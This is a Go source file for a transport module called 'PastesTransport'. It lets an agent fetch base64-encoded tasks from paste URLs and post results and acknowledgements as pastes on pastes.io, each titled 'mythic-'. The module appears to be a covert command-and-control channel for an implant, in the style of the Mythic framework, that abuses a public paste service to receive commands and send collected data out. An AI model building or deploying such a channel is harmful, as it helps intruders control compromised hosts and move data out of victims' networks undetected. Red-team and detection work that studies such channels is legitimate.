package multichannel

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
)

const pastesMaxBlobSize = 4 * 1024

// PastesTransport implements the emergency low-bandwidth Pastes.io channel.
type PastesTransport struct {
	baseURL string
	agentID string
	client  *http.Client
	mu      sync.Mutex
}

func NewPastesTransport(baseURL string) (*PastesTransport, error) {
	if baseURL == "" {
		baseURL = "https://pastes.io"
	}
	if _, err := url.ParseRequestURI(baseURL); err != nil {
		return nil, fmt.Errorf("invalid pastes base URL: %w", err)
	}
	return &PastesTransport{baseURL: strings.TrimRight(baseURL, "/"), client: &http.Client{Timeout: 15 * time.Second}}, nil
}

func (p *PastesTransport) Name() string { return "pastes" }

func (p *PastesTransport) Register(_ context.Context, agentID string, _ map[string]string) error {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.agentID = agentID
	return nil
}

func (p *PastesTransport) PullTasks(ctx context.Context, agentID, cursor string) ([]Task, string, error) {
	if cursor == "" {
		return nil, "", nil
	}
	body, err := p.fetchPaste(ctx, cursor)
	if err != nil {
		return nil, cursor, err
	}
	var payload struct {
		AgentID  string            `json:"agent_id"`
		ID       string            `json:"id"`
		Payload  string            `json:"payload"`
		Metadata map[string]string `json:"metadata"`
	}
	if err := json.Unmarshal(body, &payload); err != nil {
		return nil, cursor, fmt.Errorf("decode task paste: %w", err)
	}
	if payload.AgentID != "" && payload.AgentID != agentID {
		return nil, cursor, nil
	}
	bytesPayload, err := base64.StdEncoding.DecodeString(payload.Payload)
	if err != nil {
		return nil, cursor, err
	}
	return []Task{{ID: payload.ID, Payload: bytesPayload, Metadata: payload.Metadata, CreatedAt: time.Now().UTC()}}, "", nil
}

func (p *PastesTransport) PushResult(ctx context.Context, taskID string, result Result) error {
	payload := map[string]any{"agent_id": p.agentID, "task_id": taskID, "payload": base64.StdEncoding.EncodeToString(result.Payload), "blob_ref": result.BlobRef, "metadata": result.Metadata, "finished_at": result.FinishedAt.UTC().Format(time.RFC3339Nano)}
	blob, _ := json.Marshal(payload)
	_, err := p.createPaste(ctx, string(blob))
	return err
}

func (p *PastesTransport) UploadBlob(_ context.Context, data []byte, _ map[string]string) (BlobRef, error) {
	if len(data) > pastesMaxBlobSize {
		return BlobRef{}, fmt.Errorf("pastes blob payload too large (%d > %d)", len(data), pastesMaxBlobSize)
	}
	return BlobRef{}, errors.New("pastes transport does not support blob offload")
}

func (p *PastesTransport) DownloadBlob(_ context.Context, _ BlobRef) ([]byte, error) {
	return nil, errors.New("pastes transport does not support blob downloads")
}

func (p *PastesTransport) Ack(ctx context.Context, taskID string) error {
	payload := map[string]any{"event": "ack", "task_id": taskID, "agent_id": p.agentID}
	blob, _ := json.Marshal(payload)
	_, err := p.createPaste(ctx, string(blob))
	return err
}

func (p *PastesTransport) Healthcheck(ctx context.Context) (Status, error) {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, p.baseURL, nil)
	resp, err := p.client.Do(req)
	if err != nil {
		return Status{State: HealthDown, Message: err.Error()}, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 500 {
		return Status{State: HealthDegraded, Message: resp.Status}, nil
	}
	return Status{State: HealthOK, Message: resp.Status}, nil
}

func (p *PastesTransport) createPaste(ctx context.Context, content string) (string, error) {
	id := uuid.NewString()
	form := url.Values{"content": []string{content}, "title": []string{"mythic-" + id}}
	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, p.baseURL+"/documents", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := p.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		blob, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("pastes create failed: %s: %s", resp.Status, bytes.TrimSpace(blob))
	}
	location := resp.Header.Get("Location")
	if location == "" {
		location = p.baseURL + "/" + id
	}
	return location, nil
}

func (p *PastesTransport) fetchPaste(ctx context.Context, pasteURL string) ([]byte, error) {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, pasteURL, nil)
	resp, err := p.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return nil, fmt.Errorf("pastes read failed: %s", resp.Status)
	}
	return io.ReadAll(resp.Body)
}
